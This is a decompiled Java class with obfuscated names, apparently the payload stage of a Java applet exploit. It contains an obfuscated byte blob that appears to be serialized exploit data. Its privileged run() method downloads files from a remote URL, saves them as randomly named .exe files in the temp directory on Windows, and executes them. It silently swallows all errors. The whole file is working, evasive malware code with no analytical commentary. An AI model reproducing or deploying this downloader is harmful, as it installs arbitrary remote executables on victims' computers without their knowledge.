// 
// Decompiled by Procyon v0.5.30
// 

package zzz.ttt;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class a1500b0 implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] stb(final int n) {
        final String s = "zACzEDz0z0z0z5z7z372z0z01xz6zA617z6z61z2zEz75z74z6z96zCz2zE47z7z2z6567z6zF7z2z69z61z6E4z3z61z6zCz656Ez64617z28zFz3zDD7Dz6zEz5x0D0Cz1z020001z4zA0z01067z7z265z6z7z6Fz72z6z96z1z6zE4z375z7z4z6zFz7z665z72z7z8z720z01z2z6Az6z176z6z12Ez7574696zCz2Ez4361z6zCz656E6z46z172E6zEA4zD1EC8zDCz5xz8zEz0z300z0x5A0z0z0Cz6z17z26z5z4669z6z5z6Cz64735z36z57z449z0z0z0E666972z737z4z446z17z9z4zFz6657z6z565z6zx5A000z969z73z5z4696D6553z657z45Az00z0z76Cz656Ez696z5z6Ez7z44z9001z66zDz696zE696zDz61z6zCz44z61797z3496zEz4z669z72737z4z57656z56xz490z0z0z96E6z5z7z87z4z537z4z616D7z04z90z01z5z7365z7z269z616zCz5z6z6z572z7z369z6F6zEz4zF6Ez53z74z72z6z5z6z1z6D4A0004z7z4z696Dz65z5zx000z6z6669z656zCz64737z400z025zx495xz00z0569z73536z57z47z40z0z0z25x5zA4Cz00z0z4z7zA6zF6zE6z5z74z00144C6A6z1z76z6z1z2zFz7z57z4z6z9z6zC2Fz54z6z9z6Dz65z5zAz6zF6zE6z53zx7z8z7z001z000z000z0z1z0z1z01z000z0z0z001z00z0z0z0z0z020z0z000001z00000z12z1z563AFC0zE7z5z720002z5xz494DxAz6z0267z6EAzxz2Az5z020z00z0z7z8z700z0z000z0z11z0z00z0z000z10z0z00z0z7zD90z00z0z00z040z00z0z0z015z00z0z0z000z4z0z0z0z0z001z20z0z0z0z0z0z8zA000z00002z000z0z00z03z0z000000z1z0000z00040z000z0z0z1z0z0z0z00z0z01z1z0z000z0022z00z00z02DzEzFEz488Cz00z0z0z0z0z00z00z7z572z0z0z0z2z5zx5zAz57z8F20z39z14xz85zDzE2z0z20z0z007870z0z00z00011z0z1z010101z0z1z0z1z0z1z01z0z1z0z101z0z1z0101z010z1z0z173z7z200z1z86Az6z1z7661z2E7z574z69z6C2Ez536z96Dz7z0z6C6z5z5z4z696Dz65z5zA6Fz6zEz65zFA6z75zD6z0zD15EFz5zAz6z03z0z0z124z90z00zAz6z47z3z74z5361766z96zEz67z73z4z9z0z0066z56zEz64z4z4z6z179z49z0z00C656zE6z4446z17z9z4zF665z7z65z6z56xz4z9z0z00z76z5z6Ez6z4z4D6zFz6z465z490z00z8z65z6zEz6z44Dz6Fz6zEz74z6z8z4z90z00z7z6z5z6zE6z45z469z6D65z4z9z0z0z0zx6z56Ez6z45z4z6z96Dz6z54zDz6Fz646z5z49z0z0z09z7z2z61774F6z6z6z6z7z365z7449z00z1573z6z572z6961z6C5z6z657z2z73696F6zEz4F6Ez5374z72z65z6z1z6Dz49z00z08z737z4z617274z446179z4z9z0z0z0zE7z3z7z461z7z2744461z7z94zFz6z6z57656z5z6zx49z0z0z097z37461z7z27z44D6Fz6z46z54z9z0z0z0A7z374z6z172744zD6Fz6Ez7z4z684z9z000z973z746z1z7274z54z69z6zDz65490z0z0Dz73z7z4z61z7z27z45z469z6D654zD6zF64z6z5z49z00z09737z46z1z7z274z59z656z172z5Az0z00x7z5z7z36544z617z96zCz696z768z74z5xz0z00zx6zD6zFz6E74z684Cz6z5z6zEz6z7746z8z74z00z025zxz42z7z87z2z00z1z26Az6z17661z2zE757z4696C2E5z4z69z6zD6z55Az6Fz6zE653z1xz3zE9Fz577z44AzCAz1z02z00z01z4C0z00z2494z47z4z001z24Cz6A6z1z7z6z61z2Fz6Cz6z1z6zEz67z2zF53z74z72z6z96E67z3zx787z0740z0z0E41z6D657z2z69z63z612F4z4z61777z3z6F6zEz003z6EzE8z000z0z0z0z0z0z00z0z00z000z0z0z000z0z0z00z00z00z0z0000z000z0z0z0z0z0z0z00z00z0z0zFzE48z8zC0z00z00z00z0z020z0z0z00z000z000z000000z0z000z0z00z0z0z0z00z0z000z0000z0z000z0z0z0z000z00z0z00z0000z00z75z7z2z00z0z25zx4z2AzCF3z17Fz80z60z8z54zE0z0200z00z787z0z0z0z0000z0C1F1zCz1Fz1Ez1F1zEz1zF1F1zEz1zFz1zEz1zFz77z0A0z0z0z0z0z0060z000z0000z00z00z7z5z7z1007E0z0z0600z0z0z0z0z02z0000z0z0z0z0z00z0z00z0007z8z7372000D7zA7A7A2E7z4z7z4742zE6131z3z3z6z4z3z8z5zE8zx4zCz6z7zDDC40z9Dz8z02z00z0z07z8z7078FzFFzFFz4E2zFz9z6z4AzCz00z0zA";
        String s2 = "";
        for (int i = 0; i < s.length(); ++i) {
            if (s.charAt(i) == 'x') {
                s2 += "B";
            }
            else if (s.charAt(i) != 'z') {
                s2 += s.charAt(i);
            }
        }
        final int n2 = 2;
        final int n3 = 16;
        final byte[] array = new byte[s2.length() / n2];
        for (int j = 0; j < s2.length(); j += 2) {
            array[j >> n2 / 2] = (byte)((Character.digit(s2.charAt(j), n3) << n3 / 4) + Character.digit(s2.charAt(j + 1), n3));
        }
        return array;
    }
    
    @Override
    public Object run() throws Exception {
        if (a1500b0.data == null) {
            return null;
        }
        try {
            if (System.getProperty("os.name").indexOf("Windows") >= 0) {
                int int1 = 1;
                if (a1500b0.cc != null) {
                    int1 = Integer.parseInt(a1500b0.cc);
                }
                final int n = 1024;
                for (int i = 0; i < int1; ++i) {
                    final String s = "vmp";
                    final URL url = new URL(a1500b0.data + Integer.toString(i));
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String string = System.getProperty("ja" + s.substring(0, 1) + "a.io.t" + s.substring(1) + "dir") + "\\" + Math.random() + ".e" + "porxe".substring(3);
                    final FileOutputStream fileOutputStream = new FileOutputStream(string);
                    int n2 = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n2;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    if (n2 >= n) {
                        Runtime.getRuntime().exec(string);
                    }
                }
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    public a1500b0() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        a1500b0.data = null;
        a1500b0.cc = null;
    }
}
